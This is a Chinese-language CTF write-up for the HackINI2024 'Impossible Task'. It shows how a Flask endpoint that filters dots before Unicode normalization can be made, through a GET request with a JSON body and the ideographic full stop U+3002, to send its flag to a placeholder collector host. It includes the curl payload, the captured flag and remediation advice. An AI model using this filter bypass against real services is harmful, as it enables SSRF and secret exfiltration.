# HackINI2024 Impossible Task

## 题目简述

Flask 的 `/operation` 路由只允许 GET，却从 JSON 请求体读取 URL。程序先拒绝包含 ASCII `.` 或 `%` 的字符串，再调用 `unidecode()` 规范化 URL，并在目标后附加 `?secret=<FLAG>` 发出服务端请求。目标是用带请求体的 GET 和 Unicode 规范化差异，把 flag 发送到可控服务器。

## 解题过程

浏览器页面仍尝试 POST，所以会收到方法错误；HTTP 规范并未禁止 GET 携带请求体，Flask 的 `request.get_json()` 也会照常解析。因此手工发送：

```http
GET /operation HTTP/1.1
Content-Type: application/json

{"url":"..."}
```

第二个障碍是过滤顺序：

```python
if ("%" in url) or ("." in url):
    return "only requests to localhost are allowed", 401

url = unidecode(url)
url = url.replace(" ", "")
requests.get(url + f"?secret={FLAG}")
```

过滤发生在规范化之前。用 Unicode 句号 `。`（U+3002）代替域名中的 ASCII 点，原始字符串不含 `.` 或 `%`；`unidecode()` 随后把它转换为普通点。假设可控接收域名为 `collector.example`，请求可以写成：

```bash
curl -X GET 'http://TARGET/operation' \
  -H 'Content-Type: application/json' \
  --data '{"url":"http://collector。example/callback"}'
```

服务端最终请求：

```text
http://collector.example/callback?secret=shellmates{...}
```

在接收端日志中即可得到：

```text
shellmates{GETT1nG_FAT_w1Th_UN1C0DE_inj3CtiON}
```

## 方法总结

本题同时利用了 fat GET 和“先过滤、后规范化”的顺序错误。安全检查必须在与后续请求库一致的规范化、URL 解析和 DNS 解析之后进行；只过滤点号与百分号既无法限制主机，也会被 Unicode 同形字符绕过。敏感值更不应自动拼到任意用户指定的外发 URL 上。
